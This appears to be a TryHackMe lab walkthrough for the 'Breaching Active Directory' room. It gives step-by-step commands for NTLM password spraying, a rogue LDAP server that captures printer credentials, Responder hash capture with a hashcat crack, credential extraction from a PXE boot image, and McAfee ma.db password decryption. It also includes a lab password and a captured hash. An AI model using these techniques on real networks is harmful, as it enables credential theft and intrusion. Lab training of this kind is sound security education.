# Breaching Active Directory

## High-Level Overview

Practice common techniques and tools that can be used to acquire the first set of AD credentials so you can further use them to enumerate and exploit AD.

## Tools Needed

* Python
* OpenLDAP
* Responder
* Hashcat

## Walkthrough

### Connecting to the Network

* Download the Network VPN Server `Breachingad` configuration file for OpenVPN
* Connect using OpenVPN and the TryHackMe VPN file
	* `sudo openvpn user-breachingad.ovpn`
* Configure the DNS on the host which you are running the VPN connection:
	* Edit the `resolv.conf` file with the command `sudo nano /etc/resolv.conf` and add the line `nameserver 10.200.55.101` at the end of the file.
	* Or use `sudo resolvectl dns breachad 10.200.55.101`
	* `10.200.55.101` is the IP of the `THMDC` in my case.
* Test DNS resolution with the command `nslookup thmdc.za.tryhackme.com` - this should resolve to the IP of the DC
* Your IP for can be identified using `ip add show breachad` - the inet IP you will use for reverse shells, listeners, etc.

### Task 3

Download the provided task archive file and unzip it.

Inside we have a python script named `ntlm_passwordspray.py` and a file named `username.txt`

We can use the script to perform a password spray attack on the given target by using the following command:

```bash
$ python ntlm_passwordspray.py -u usernames.txt -p Changeme123 -f za.tryhackme.com -a http://ntlmauth.za.tryhackme.com/
```

We supplied `Changeme123` as our password to spray. After running the script, we can see that 4 users have this password. These users are: `hollie.powerll`, `heather.smith`, `gordon.stevens` and `georgina.edwards`

We are also required to identify the message displayed by the web application when authenticating with a valid credential pair. We can modify the script to print out the response by adding the line `print(response.text)` as shown below:

```python
    def password_spray(self, password, url):
        print ("[*] Starting passwords spray attack using the following password: " + password)
        count = 0
        for user in self.users:
            response = requests.get(url, auth=HttpNtlmAuth(self.fqdn + "\\" + user, password))
            if (response.status_code == self.HTTP_AUTH_SUCCEED_CODE):
                print (response.text)
                print ("[+] Valid credential pair found! Username: " + user + " Password: " + password)
                count += 1
                continue
            if (self.verbose):
                if (response.status_code == self.HTTP_AUTH_FAILED_CODE):
                    print ("[-] Failed login with Username: " + user)
        print ("[*] Password spray attack completed, " + str(count) + " valid credential pairs found")
```

Running the script again with the same command as above, reveals the text contained in the response when a pair of credentials is valid.

### Task 4

* Navigate to `http://printer.za.tryhackme.com/settings.aspx`
	* There is a network printer in this network where the administration website does not require credentials.
	* Inspecting this website we can see it does not send the LDAP password back to the browser but we do have a username
* Hosting a Rogue LDAP Server - using OpenLDAP - run the following commands:

```bash
$ sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd`
$ sudo dpkg-reconfigure -p low slapd
```

* Select `No` when requested if you want to skip server configuration
* DNS domain name: `za.tryhackme.com`
* Organization name: `za.tryhackme.com`
* Administrator password: `*****`
* Select `MDB` as the LDAP database to use
* Ensure the database is not removed when purged by selecting `No`
* Move old database files before a new one is created by selecting `Yes`
* Create a new `olcSaslSecProps.ldif` file with the following contents:

```
#olcSaslSecProps.ldif
dn: cn=config
replace: olcSaslSecProps
olcSaslSecProps: noanonymous,minssf=0,passcred
```

* Use the `ldif` file to patch our LDAP server using the command:
	* `sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart`
* Verify that our rogue LDAP server's config has been applied using the command:
	* `ldapsearch -H ldap:// -x -LLL -s base -b "" supportedSASLMechanisms`
* Capturing LDAP Credentials
	* `sudo tcpdump -SX -i breachad tcp port 389`
* Click the "Test Settings" at `http://printer.za.tryhackme.com/settings.aspx` (after changing the Server field to your attacking machine IP)
	* If we receive the error message `LDAP Connection failed: The distinguished name contains invalid syntax.` it means we successfully downgraded the connection.
* Switch back to the tcpdump and check the leaked credential
* Finally, run `ps -a` or `netstat -al` or `sudo netstat -antp` to see running services, and to disable ldap/slapd you can run the commands below:

```bash
$ sudo systemctl stop slapd
$ sudo systemctl disable slapd
```

### Task 5

* Download the attached task files
	* It contains a file named `passwordlist.txt`
* We will use `responder` to perform a Man-in-the-Middle attack and see if we can capture a NTLM. We can do this by running the command:

```bash
$ sudo responder -I breachad
```

* After some time we get some information in our listener:

```
[SMB] NTLMv2-SSP Client   : 10.200.55.202
[SMB] NTLMv2-SSP Username : ZA\svcFileCopy
[SMB] NTLMv2-SSP Hash     : svcFileCopy::ZA:db805ef73a51a4f7:03D0556EFAC05D7E0A0E00B535F6435A:0101000000000000808F222B049BD901AF7ED87CB98077B80000000002000800350036004100390001001E00570049004E002D00520049005000430051004800480038004D005700460004003400570049004E002D00520049005000430051004800480038004D00570046002E0035003600410039002E004C004F00430041004C000300140035003600410039002E004C004F00430041004C000500140035003600410039002E004C004F00430041004C0007000800808F222B049BD90106000400020000000800300030000000000000000000000000200000665FB1D0F4FEA524330D62552504C15C47F0E14AAC76334360E69E69B833B8A80A001000000000000000000000000000000000000900200063006900660073002F00310030002E00350030002E00350033002E00310038000000000000000000
```

* This information contains the username associated with the NTLM authentication challenge, as well as the client IP and the hash containing the password
* We can save the NTLMv2-SSP Hash to a file named `hash.txt`
* Now we can crack the hash using `hashcat` by running the command:

```bash
$ hashcat -m 5600 hash.txt passwordlist.txt --force
```

### Task 6

* Connect to `http://pxeboot.za.tryhackme.com/` to see all the available BCD files of the PXE Boot images
	* In my case, I will be using `x64{F60FB8A8-5F65-474A-8450-C8D3A20957B5}.bcd`
* Connect to the `THMJMP1` machine using SSH by typing the command:
	* `ssh thm@THMJMP1.za.tryhackme.com`
	* Password is `Password1@`
* We are now logged in via SSH on a Windows machine
* Create a folder with your username and copy the `powerpxe` repo (already located on this machine) into your folder

```powershell
> cd Documents
> mkdir radupopa
> copy C:\powerpxe radupopa
> cd radupopa
```

* Lookup THMMDT IP with `nslookup thmdt.za.tryhackme.com`
	* In my case, the IP was `10.200.55.202`
* Initiate the TFTP transfer inside the SSH session using the command:

```bash
$ tftp -i 10.200.55.202 GET "\Tmp\x64{F60FB8A8-5F65-474A-8450-C8D3A20957B5}.bcd" conf.bcd
```

* Start a powershell session and run the following commands to recover the locations of the PXE Boot images from the BCD file:

```powershell
> powershell -executionpolicy bypass
> Import-Module .\PowerPXE.ps1
> $BCDFile = "conf.bcd"
> Get-WimFile -bcdFile $BCDFile
```

* The output looks like this:

```powershell
PS C:\Users\thm\Documents\radupopa> Get-WimFile -bcdFile $BCDFile
>> Parse the BCD file: conf.bcd
>>>> Identify wim file : \Boot\x64\Images\LiteTouchPE_x64.wim
\Boot\x64\Images\LiteTouchPE_x64.wim
```

* Now that we have the location of the PXE Boot image, we can use TFTP again to download this image using the command:
	* `tftp -i 10.200.55.202 GET "\Boot\x64\Images\LiteTouchPE_x64.wim" pxeboot.wim`
	* It will take around 5 minutes to download
* Finally, we can recover credentials from the PXE Boot image using the command:

```powershell
> Get-FindCredentials -WimFile pxeboot.wim
```

### Task 7

* Download the task files - an archive named `mcafeesitelistpwddecryption.zip`
* Unzipping the archive, we can see it contains a Python script and a markdown file with instructions
* On the same machine that we are logged in from the previous task, change to the directory indicated in the command below:
	* `cd C:\ProgramData\McAfee\Agent\DB`
	* List the contents of the directory using `dir`
* This directory contains a `ma.db` file which contains embedded credentials used during installation
* Transfer those by running the following command on your attacking machine:
	* `scp thm@THMJMP1.za.tryhackme.com:C:/ProgramData/McAfee/Agent/DB/ma.db .`
* On your attacker machine, open the database with `sqlitebrowser` using the terminal:
	* `sqlitebrowser ma.db`
* With the database open, focus on the `AGENT_REPOSITORIES` table, especially the `DOMAIN`, `AUTH_USER` and `AUTH_PASSWD` fields. Make note of these values.
* `AUTH_PASSWD` is encrypted, however the tool we downloaded in the task files can help us decrypt it.
* We will decrypt the password using the following command:

```bash
$ python2 mcafee_sitelist_pwd_decrypt.py AUTH_PASSWD_VALUE
```